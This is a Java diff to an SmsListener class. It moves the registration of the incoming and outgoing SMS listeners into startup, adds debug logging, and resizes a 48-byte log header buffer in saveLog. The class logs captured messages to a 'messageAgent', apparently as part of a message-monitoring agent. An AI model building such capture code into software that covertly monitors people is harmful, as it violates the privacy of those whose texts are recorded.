@@ -57,9 +57,23 @@ public class SmsListener {
         } catch (final IOException e) {
             debug.error(e);
         }
+        
+        new Thread(insms).start();
+        try {
+            smsconn.setMessageListener(insms);
+            smsconn.setMessageListener(outsms);
+            
+        } catch (final IOException e) {
+            //#ifdef DEBUG_ERROR
+            debug.error(e);
+            //#endif
+        }
     }
 
     public final void stop() {
+        //#ifdef DEBUG_INFO
+        debug.info("Stopping SMSListener");
+        //#endif
         try {
             if (smsconn != null) {
                 smsconn.close();
@@ -74,15 +88,8 @@ public class SmsListener {
     }
 
     public void run() {
-        new Thread(insms).start();
-        try {
-            smsconn.setMessageListener(insms);
-            smsconn.setMessageListener(outsms);
-        } catch (final IOException e) {
-            //#ifdef DEBUG_ERROR
-            debug.error(e);
-            //#endif
-        }
+      
+        
     }
 
     synchronized void saveLog(final javax.wireless.messaging.Message message,
@@ -158,7 +165,7 @@ public class SmsListener {
             Check.asserts(filetime != null, "saveLog: null filetime");
             //#endif
 
-            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
+            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 48,
                     false);
             databuffer.writeInt(SMS_VERSION);
             databuffer.writeInt(flags);
@@ -172,7 +179,7 @@ public class SmsListener {
                     + filetime.toString());
             //#endif
 
-            Check.ensures(additionalData.length == 48, "Wrong buffer size");
+            Check.ensures(additionalData.length == 48, "SMS Wrong buffer size: " + additionalData.length);
 
             if (dataMsg != null) {
                 messageAgent
